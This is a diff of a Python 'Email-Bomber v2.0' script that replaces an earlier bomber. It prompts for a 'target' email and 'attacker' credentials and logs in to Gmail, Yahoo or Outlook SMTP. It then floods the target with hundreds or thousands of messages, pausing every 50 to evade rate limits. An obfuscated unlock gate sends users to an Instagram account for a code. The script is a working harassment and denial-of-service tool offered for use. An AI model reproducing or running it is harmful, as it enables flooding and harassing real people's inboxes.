@@ -1,94 +1,186 @@
-# -*- coding: utf-8 -*-
-#=========================================================================================================================================
-
-import os
-import random
+import time #line:3
+from colorama import Fore ,Back ,Style ,init #line:4
+init (autoreset =True )#line:5
+def startMessage ():#line:7
+    OO0O0OO0OOO0OO0O0 =input (Fore .YELLOW +"Enter Code To Unlock The Tool : ")#line:8
+    OOOO0OO000OO0OOOO ="iloveu"#line:9
+    if OOOO0OO000OO0OOOO !=OO0O0OO0OOO0OO0O0 :#line:10
+        print (Fore .RED +'[X] Wrong Code')#line:11
+        print (Fore .BLUE +''' 
+   1. Go to Insta and massage 
+   2. Insta ID: qadirahmad6291
+   3. Send massage for code
+   4. Next time come with code and use this tool
+   5. bye
+    ''')#line:18
+        startMessage ()#line:19
+    else :#line:20
+        print (Fore .GREEN +"Successfully Unlocked Tool!")#line:21
+        pass #line:22
+if __name__ =="__main__":#line:24
+    startMessage ()#line:25
 import smtplib
 import sys
-import getpass
 import time
 
-# ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■ Welcome ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
 
-from tqdm import trange
-from colorama import Fore
-
-# Progress Bar_Loading:
-color_bars =[
-    
-    Fore.GREEN,
-    ]
-
-for color in color_bars:
-    for i in trange(int(7**7.5),  #4e5
-                    bar_format="{l_bar}%s{bar}%s{r_bar}" % (color, Fore.RESET)):
-        pass
-
-os.system('cls')
-print ('''
-\033[92m
-                                                        
-@@@@@@@@@@   @@@@@@@    @@@@@@   @@@@@@@@@@   @@@@@@@   
-@@@@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@@@@  @@@@@@@@  
-@@! @@! @@!  @@!  @@@  @@!  @@@  @@! @@! @@!  @@!  @@@  
-!@! !@! !@!  !@   @!@  !@!  @!@  !@! !@! !@!  !@   @!@  
-@!! !!@ @!@  @!@!@!@   @!@  !@!  @!! !!@ @!@  @!@!@!@   
-!@!   ! !@!  !!!@!!!!  !@!  !!!  !@!   ! !@!  !!!@!!!!  
-!!:     !!:  !!:  !!!  !!:  !!!  !!:     !!:  !!:  !!!  
-:!:     :!:  :!:  !:!  :!:  !:!  :!:     :!:  :!:  !:!  
-:::     ::    :: ::::  ::::: ::  :::     ::    :: ::::  
- :      :    :: : ::    : :  :    :      :    :: : ::   
-                                                        
-
-                       Coded by \033[93mQADIR AHMAD \033[97m
-
-''')
-print(" ")
-
-#Information:
-    
-user = input('\033[92mYour \033[92mGmail\033[97m :\033[94m ')
-Password = getpass.getpass('\033[92mYour \033[92mPassword\033[97m :\033[94m ')
-print(" ")
-sender = input('\033[91mTo Victim \033[91mEmail\033[97m : \033[94m')
-message = input('\033[92mYour \033[92mMessage\033[97m : \033[94m')
-print(" ")
-color = input('\033[92mNumber of \033[92msend\033[97m : \033[94m')
-print(" ")
-print("\033[94m📮\033[92mSending : ")
+class bColors:
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    RED = '\033[91m'
+    BLUE = '\033[94m'
 
 
-# SMTP_SERVER_INFO:
-smtp_server = 'smtp.gmail.com'
-port = 587
+def banner():
+    print(bColors.BLUE + '<<< Email-Bomber v2.0>>>')
+    print(bColors.YELLOW + r'''
+  _
+ | |
+ | |___
+ |  _  \ _   _
+ | |_)  | (_) |
+  \____/ \__, |
+          __/ |
+         |___/
+                                                                                                 _
+ / _ \    / \  |  _ \_ _|  _ \
+| | | |  / _ \ | | | | || |_) |
+| |_| | / ___ \| |_| | ||  _ <
+ \__\_\/_/   \_\____/___|_| \_\
+                                                      (_)
 
-#Login:
-try:
-    server = smtplib.SMTP(smtp_server,port) 
-    server.ehlo()
+     ''')
 
-    if smtp_server == "smtp.gmail.com":
-            server.starttls()
-    server.login(user,Password)
 
-# Sending:
+class EmailBomber:
+    count = 0
 
-    for i in range(1, color+1):
-        subject = os.urandom(9)
-        message = 'From: ' + user + '\nSubject: ' + subject + '\n' + message
-        server.sendmail(user, sender, message)
-        print ("\033[94m☑\033[97m Email \033[92mSENT\033[97m  :\033[93m %i") % i
-        sys.stdout.flush()
-    server.quit()
-    print ('\033[93m☑\033[97m All \033[97mMessage was\033[92m sent\033[97m ')
-    
-    
-except KeyboardInterrupt:
-    print ('[✘] Canceled')
-    sys.exit()
-except smtplib.SMTPAuthenticationError:
-    print(" ")
-    print("\033[94m⚠️\033[91mError \033[97m:")
-    print ('\033[94m⚠️\033[97mThe \033[93musername \033[97mor \033[93mpassword \033[97myou entered is incorrect.')
-    print ("\033[94m⚠️\033[91mCheck if the Options of 'Applications are less secure' is enabled\nCheck at https://myaccount.google.com/lesssecureapps")
-    sys.exit()
+    def __init__(self):
+        self.countFactor = None
+        self.amount = None
+        self.port = None
+        self.server = None
+        self.fromAddr = None
+        self.fromPwd = None
+        self.subject = None
+        self.message = None
+        self.msg = None
+        self.s = None
+        self.r = bColors.RED
+        self.g = bColors.GREEN
+        self.b = bColors.BLUE
+        self.y = bColors.YELLOW
+        try:
+            print(self.b + '\n[+] Initializing bomber ...')
+            self.target = str(input(self.g + '[:] Enter Target Email > '))
+            self.mode = int(input(self.g + '[:] Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) > '))
+
+            if int(self.mode) > int(4) or int(self.mode) < int(1):
+                print(self.r + '[-] ERROR: Invalid Option!')
+                sys.exit(0)
+
+        except Exception as e:
+            print(self.r + f'\n[-] ERROR: {e}')
+            sys.exit(0)
+
+    def bomb(self):
+        try:
+            print(self.b + '\n[+] Setting up bomb ...')
+
+            if self.mode == int(1):
+                self.amount = int(1000)
+            elif self.mode == int(2):
+                self.amount = int(500)
+            elif self.mode == int(3):
+                self.amount = int(250)
+            else:
+                self.amount = int(input(self.g + '[:] Choose a CUSTOM amount > '))
+            print(self.g + f'[+] You have selected BOMB mode {self.mode} and {self.amount} emails')
+
+        except Exception as e:
+            print(self.r + f'\n[-] ERROR: {e}')
+            sys.exit(0)
+
+    def email(self):
+        try:
+            print(self.b + '\n[+] Setting up email ...')
+            self.server = str(input(self.g + '[:] Enter email server | or select premade options - 1:Gmail 2:Yahoo '
+                                             '3:Outlook 4:Custom > '))
+            defaultPort = True
+
+            if self.server == '4':
+                defaultPort = False
+                self.port = int(input(self.g + '[:] Enter port number > '))
+
+            if defaultPort:
+                self.port = int(587)
+
+            if self.server == '1':
+                self.server = 'smtp.gmail.com'
+            elif self.server == '2':
+                self.server = 'smtp.mail.yahoo.com'
+            elif self.server == '3':
+                self.server = 'smtp-mail.outlook.com'
+
+            self.fromAddr = str(input(self.g + '[:] Enter attacker email address > '))
+            self.fromPwd = str(input(self.g + '[:] Enter attacker password > '))
+            self.subject = str(input(self.g + '[:] Enter subject > '))
+            self.message = str(input(self.g + '[:] Enter message > '))
+
+            if self.target == self.fromAddr:
+                print(self.r + '\n[-] ERROR: Can\'t have same Attacker and Target address.')
+
+            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
+                        ''' % (self.fromAddr, self.target, self.subject, self.message)
+
+            self.s = smtplib.SMTP(self.server, self.port)
+            self.s.ehlo()
+            self.s.starttls()
+            self.s.ehlo()
+            self.s.login(self.fromAddr, self.fromPwd)
+
+        except Exception as e:
+            print(self.r + f'\n[-] ERROR: {e}')
+            sys.exit(0)
+
+    def send(self):
+        try:
+            self.s.sendmail(self.fromAddr, self.target, self.message)
+            self.count += 1
+            loadSeq = float(self.count) * self.countFactor
+            sys.stdout.write(self.y + '\r' + '[BOMBED EMAILS:' + self.b + f' {self.count}' + self.y + ']' + self.b +
+                             ' [' + self.g + ('#' * int(loadSeq)) + self.b + ']')
+            sys.stdout.flush()
+            if self.count % 50 == 0 and self.count != self.amount:
+                time.sleep(0.5)
+                sys.stdout.flush()
+                waitLimit = 60
+                while waitLimit > 0:
+                    sys.stdout.write(self.r + '\r' + f'[↻] Sent {self.count} emails ... RESETTING CONNECTION !! => ' +
+                                     self.y + ' Wait for ' + str(waitLimit) + ' seconds')
+                    time.sleep(1)
+                    waitLimit -= 1
+                    sys.stdout.flush()
+
+        except Exception as e:
+            print(self.r + f'\n[-] ERROR: {e}')
+            sys.exit(0)
+
+    def attack(self):
+        print(self.b + '\n[+] Attacking ...')
+        print(self.y + '\r' + '[' + self.r + '☠' + self.y + '] BOMBING emails')
+        self.countFactor = float(100 / self.amount)
+        for email in range(self.amount):
+            self.send()
+        self.s.close()
+        print(self.g + '\n[+] Attack Finished !!')
+        print(self.g + f'[+] Successfully BOMBED {self.amount} emails !!')
+        sys.exit(0)
+
+
+if __name__ == '__main__':
+    banner()
+    bomb = EmailBomber()
+    bomb.bomb()
+    bomb.email()
+    bomb.attack()
